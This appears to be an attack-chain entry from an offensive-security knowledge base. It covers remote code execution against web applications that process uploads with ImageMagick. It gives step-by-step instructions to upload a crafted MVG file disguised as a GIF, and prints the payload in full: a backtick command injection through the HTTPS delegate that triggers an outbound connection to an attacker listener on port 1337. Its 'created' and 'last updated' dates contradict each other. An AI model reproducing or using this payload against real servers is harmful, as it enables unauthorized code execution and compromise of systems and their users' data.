---
tags:
  - rce
  - file-upload
  - imagemagick
  - mvg
  - command-injection
type: attack_chain
tools:
  - '[[tools/ImageMagick]]'
  - '[[tools/curl]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/wget-reverse-connection]]'
platforms:
  - Web
  - Linux
complexity: medium
procedures:
  - '[[procedures/Exploit-ImageMagick-RCE-with-MVG-Upload]]'
step_count: 1
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
description: >-
  Exploit a file upload vulnerability in the profile picture feature to achieve
  remote code execution on the server using ImageMagick's MVG parsing and
  command injection in the HTTPS delegate.
skill_level: intermediate
impact_level: high
id: e634ee1a-f6d1-4e49-a7dc-1145875af10c
created_at: '2025-12-14T17:23:41.875Z'
updated_at: '2025-12-14T17:23:41.875Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Unix Shell]]'
---
# RCE via Malicious MVG File Upload in Profile Picture Feature

Multi-stage attack chain demonstrating a complete attack workflow exploiting ImageMagick's vulnerability in a web application's file upload feature to achieve arbitrary remote command execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 1 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[File Upload] --> B[RCE Execution]
    B --> C[Reverse Connection]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/ImageMagick]] (server-side, exploited)
- [[tools/curl]] (invoked by ImageMagick)

### Target Environment

- Web platform with ImageMagick for image processing
- Profile picture upload endpoint at /settings/profile/edit
- Server running Linux with ImageMagick configured to use HTTPS delegate via curl

### Initial Access Requirements

- Authenticated access to the web application (e.g., user account on HackerOne-like platform)
- Network access to upload files to the target
- Attacker-controlled server listening on port 1337 for reverse connection

## Detailed Attack Procedures

### Step 1: Malicious File Upload and RCE Trigger
procedure: [[procedures/Exploit-ImageMagick-RCE-with-MVG-Upload]]

**Objective**: Upload a malicious MVG file disguised as an image to trigger ImageMagick processing, leading to command injection and remote code execution via the HTTPS delegate.

**Instructions**: Prepare a malicious ASCII file named x.gif containing MVG directives that exploit the vulnerability. The content should include a push/pop graphic context with an image over directive pointing to a crafted HTTPS URL that injects a shell command using backticks.

Create the file with the following content:

```
push graphic-context
viewbox 0 0 640 480
image over 0,0 0,0 'https://127.0.0.1/x.php?x=`[[commands/wget-reverse-connection]]`'
pop graphic-context
```

Navigate to the profile picture upload at /settings/profile/edit and upload the x.gif file. The server processes it with ImageMagick, parsing the MVG and invoking curl via the HTTPS delegate, which executes the injected command.

**Expected Output**: No immediate visible output on the client, but the server executes the command, resulting in an outbound connection to the attacker's server on port 1337.

**Success Indicators**:
- Incoming connection from the target server to attacker's listener on port 1337
- Server logs (if accessible) showing ImageMagick processing and curl invocation
- Potential errors in ImageMagick if the exploit fails, but successful RCE suppresses output

## Attack Chain Summary

### Key Achievements

1. Bypassed file upload validation by disguising MVG as GIF
2. Exploited ImageMagick's MVG parsing for command injection
3. Achieved arbitrary RCE with outbound connection for further exploitation

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Unix Shell]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2023-10-01T00:00:00Z*
